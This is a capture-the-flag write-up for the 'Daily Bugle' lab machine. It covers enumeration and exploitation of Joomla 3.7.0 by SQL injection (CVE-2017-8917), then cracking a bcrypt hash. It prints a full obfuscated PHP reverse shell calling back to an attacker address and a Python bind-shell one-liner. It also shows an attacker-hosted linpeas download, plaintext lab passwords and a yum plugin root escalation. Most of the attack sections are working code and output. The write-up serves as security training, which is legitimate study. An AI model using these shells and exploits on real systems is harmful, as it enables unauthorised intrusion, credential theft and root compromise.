# Daily Bugle
## Table of Contents
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
  * [Web Browsing](#web-browsing)
  * [Web Crawling](#web-crawling)
  * [Vulnerability Scanning](#vulnerability-scanning)
* [Exploit](#exploit)
* [Explore](#explore)
* [Escalate](#escalate)

## Enumerate
### Ports
An initial Nmap port scan discovered TCP ports 22,80,3306 and UDP port 68 were open.
```bash
sudo nmap 10.10.22.113 -sS -sU -oN DailyBugle-OpenPorts-Quick.nmap

# output
Nmap scan report for 10.10.22.113
Host is up (0.21s latency).
Not shown: 1996 closed ports
PORT     STATE         SERVICE
22/tcp   open          ssh
80/tcp   open          http
3306/tcp open          mysql
68/udp   open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1012.16 seconds
```

A complete Nmap port scan discovered no additional ports were open.
```bash
sudo nmap 10.10.22.113 -sS -sU -p- -oN DailyBugle-OpenPorts-All.nmap
```

### Services
Nmap determined the target is running the following service versions:
* OpenSSH 7.4 (protocol 2.0)
* Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
* MariaDB (unauthorized)

```bash
sudo nmap 10.10.22.113 -sS -sU -p T:22,80,3306,U:68 -sV -oN DailyBugle-ServiceVersions.nmap

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 05:48 MDT
Nmap scan report for 10.10.22.113
Host is up (0.21s latency).

PORT     STATE         SERVICE VERSION
22/tcp   open          ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open          http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open          mysql   MariaDB (unauthorized)
68/udp   open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.58 seconds
```

### Web Browsing
An HTML form and the first flag were found using Firefox. The source code for the home page also suggested Joomla as the backend web app. robots.txt suggested the major version is Joomla 3.7 while the manifest file confirmed the actual version is 3.7.0.
```bash
firefox http://10.10.22.113 # found the first flag (Who robbed the bank?)
firefox http://10.10.22.113/README.txt # says app is Joomla 3.7
firefox http://10.10.22.113/robots.txt # see below for list of folders
wget http://10.10.22.113/libraries/cms/version/version.php # path for Joomla 3.x version file; was empty
wget http://10.10.22.13/administrator/manifests/files/joomla.xml # 

# Output from robots.txt
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

### Web Crawling
Dirsearch discovered several web files and directories of interest. 
```bash
git clone https://github.com/maurosoria/dirsearch
python3 dirsearch/dirsearch.py -u 10.10.22.113 --simple-report DailyBugle-WebCrawl.txt

# output
# Dirsearch started Mon Apr 12 05:48:58 2021 as: dirsearch/dirsearch.py -u 10.10.22.113 --plain-text-report DailyBugle-WebCrawl.txt

403   216B   http://10.10.22.113:80/.htaccess.bak1
403   216B   http://10.10.22.113:80/.htaccess.save
403   216B   http://10.10.22.113:80/.htaccess.orig
403   217B   http://10.10.22.113:80/.htaccess_extra
403   218B   http://10.10.22.113:80/.htaccess.sample
403   216B   http://10.10.22.113:80/.htaccess_orig
403   213B   http://10.10.22.113:80/.ht_wsr.txt
403   214B   http://10.10.22.113:80/.htaccess_sc
403   214B   http://10.10.22.113:80/.htaccessBAK
403   214B   http://10.10.22.113:80/.htaccessOLD
403   215B   http://10.10.22.113:80/.htaccessOLD2
403   207B   http://10.10.22.113:80/.html
403   206B   http://10.10.22.113:80/.htm
403   216B   http://10.10.22.113:80/.htpasswd_test
403   212B   http://10.10.22.113:80/.htpasswds
403   213B   http://10.10.22.113:80/.httr-oauth
403   211B   http://10.10.22.113:80/.user.ini
200    18KB  http://10.10.22.113:80/LICENSE.txt
200     4KB  http://10.10.22.113:80/README.txt
301   242B   http://10.10.22.113:80/administrator    -> REDIRECTS TO: http://10.10.22.113/administrator/
403   225B   http://10.10.22.113:80/administrator/.htaccess
200    31B   http://10.10.22.113:80/administrator/cache/
200     2KB  http://10.10.22.113:80/administrator/includes/
200    31B   http://10.10.22.113:80/administrator/logs/
301   247B   http://10.10.22.113:80/administrator/logs    -> REDIRECTS TO: http://10.10.22.113/administrator/logs/
200     5KB  http://10.10.22.113:80/administrator/
200     5KB  http://10.10.22.113:80/administrator/index.php
301   232B   http://10.10.22.113:80/bin    -> REDIRECTS TO: http://10.10.22.113/bin/
200    31B   http://10.10.22.113:80/bin/
301   234B   http://10.10.22.113:80/cache    -> REDIRECTS TO: http://10.10.22.113/cache/
200    31B   http://10.10.22.113:80/cache/
403   210B   http://10.10.22.113:80/cgi-bin/
200    31B   http://10.10.22.113:80/cli/
301   239B   http://10.10.22.113:80/components    -> REDIRECTS TO: http://10.10.22.113/components/
200    31B   http://10.10.22.113:80/components/
200     0B   http://10.10.22.113:80/configuration.php
200     3KB  http://10.10.22.113:80/htaccess.txt
200    31B   http://10.10.22.113:80/images/
301   235B   http://10.10.22.113:80/images    -> REDIRECTS TO: http://10.10.22.113/images/
301   237B   http://10.10.22.113:80/includes    -> REDIRECTS TO: http://10.10.22.113/includes/
200    31B   http://10.10.22.113:80/includes/
200     9KB  http://10.10.22.113:80/index.php
301   237B   http://10.10.22.113:80/language    -> REDIRECTS TO: http://10.10.22.113/language/
200    31B   http://10.10.22.113:80/layouts/
301   238B   http://10.10.22.113:80/libraries    -> REDIRECTS TO: http://10.10.22.113/libraries/
200    31B   http://10.10.22.113:80/libraries/
301   234B   http://10.10.22.113:80/media    -> REDIRECTS TO: http://10.10.22.113/media/
200    31B   http://10.10.22.113:80/media/
301   236B   http://10.10.22.113:80/modules    -> REDIRECTS TO: http://10.10.22.113/modules/
200    31B   http://10.10.22.113:80/modules/
200    31B   http://10.10.22.113:80/plugins/
301   236B   http://10.10.22.113:80/plugins    -> REDIRECTS TO: http://10.10.22.113/plugins/
200   836B   http://10.10.22.113:80/robots.txt
301   238B   http://10.10.22.113:80/templates    -> REDIRECTS TO: http://10.10.22.113/templates/
200    31B   http://10.10.22.113:80/templates/
200     0B   http://10.10.22.113:80/templates/beez3/
200    31B   http://10.10.22.113:80/templates/index.html
200     0B   http://10.10.22.113:80/templates/protostar/
200     0B   http://10.10.22.113:80/templates/system/
200    31B   http://10.10.22.113:80/tmp/
301   232B   http://10.10.22.113:80/tmp    -> REDIRECTS TO: http://10.10.22.113/tmp/
200     2KB  http://10.10.22.113:80/web.config.txt
```

### Vulnerability Scanning
SSH
```bash
nmap 10.10.22.113 --script ssh-* -oN DailyBugle-VulnScan-SSH.nmap

# output
```

HTTP
```bash
nmap 10.10.22.113 --script http-* -oN DailyBugle-VulnScan-HTTP.nmap
```

## Exploit
Used searchsploit to find a potential vulnerability for exploitation (CVE-2017-8917).
```bash
searchsploit joomla 3.7.0

# output
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                  | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                               | php/webapps/43488.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

searchsploit -x 42033 # found potential vulnerability: CVE-2017-8917
```

Joomblah was able to inject SQL queries and discover information about a user named Jonah:
* User ID: 811
* Name: Super User
* Username: jonah
* Email: jonah@tryhackme.com
* Password hash (Bcrypt): $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```bash
git clone http://github.com/stefanlucas/Exploit-Joomla
cd Exploit-Joomla/
chmod +x joomblah.py
./joomblah.py http://10.10.22.113/

# output
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

### Password Guessing
Hashcat
```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash

hashcat -m 3200 jonah.hash /usr/share/wordlists/rockyou.txt

# output
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Mon Apr 12 06:59:05 2021 (24 mins, 9 secs)
Time.Estimated...: Mon Apr 12 07:23:14 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       33 H/s (7.02ms) @ Accel:4 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 46840/14344385 (0.33%)
Rejected.........: 0/46840 (0.00%)
Restore.Point....: 46832/14344385 (0.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidates.#1....: staffy -> sorriso

Started: Mon Apr 12 06:58:57 2021
Stopped: Mon Apr 12 07:23:15 2021

# password = spiderman123
```

### Local File Inclusion 
Gaining access as the apache (Reference: https://www.hackingarticles.in/joomla-reverse-shell/) 
* Started a handler
* Logged into http://10.10.22.113/administrator/index.php as 'jonah'
* Navigated to Extensions > Templates > Templates > Beez3 Details and Files
* Modified and saved index.php 
* Navigated to http://10.10.22.113/templates/beez3/index.php

Netcat Handler
```bash
# on the attacker side
msfvenom -p php/reverse_tcp LHOST=10.2.76.52 LPORT=5050 R
nc -nvlp 5050
```

PHP Reverse Shell
```php
<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='10.2.76.52';
    $port=5050;

    if(!function_exists('LQxzAX')){
      function LQxzAX($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $HAylwXT='is_callable';
      $jWNz='in_array';
      
      if($HAylwXT('exec')and!$jWNz('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($HAylwXT('passthru')and!$jWNz('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($HAylwXT('popen')and!$jWNz('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($HAylwXT('system')and!$jWNz('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($HAylwXT('proc_open')and!$jWNz('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($HAylwXT('shell_exec')and!$jWNz('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://10.2.76.52",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=LQxzAX(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=LQxzAX(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
```

### Changing to a TTY Shell
```bash
# on the victim side
which python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'

# on the attacker side
nc 10.10.22.113 4444
```

## Explore
Ran Linenum and Linpeas to identify privilege escalation options. 
```bash
# on the victim side
wget http://10.2.76.52/linpeas.sh
chmod +x linpeas.sh
./linenum.sh > DailyBugle_linpeas.txt
python -m SimpleHTTPServer 8080

# on the attacker side
wget http://10.10.22.113:8080/DailyBugle_linpeas.txt
```

## Escalate
Linpeas discovered the user 'jjameson' and a password from a PHP configuration file (/var/www/html/configuration.php). I was able to authenticate to this account with the password (via the shell apache provided). 
```bash
su jjameson # password: nv5uz9r3ZEDzVjNu
cd ~
cat user.txt # found second flag 
```

```bash
sudo -l 

# output
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Reference: https://gtfobins.github.io/gtfobins/yum/
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

```bash
sudo yum -c $TF/x --enableplugin=y
cd /root
cat root.txt # found the final flag
```
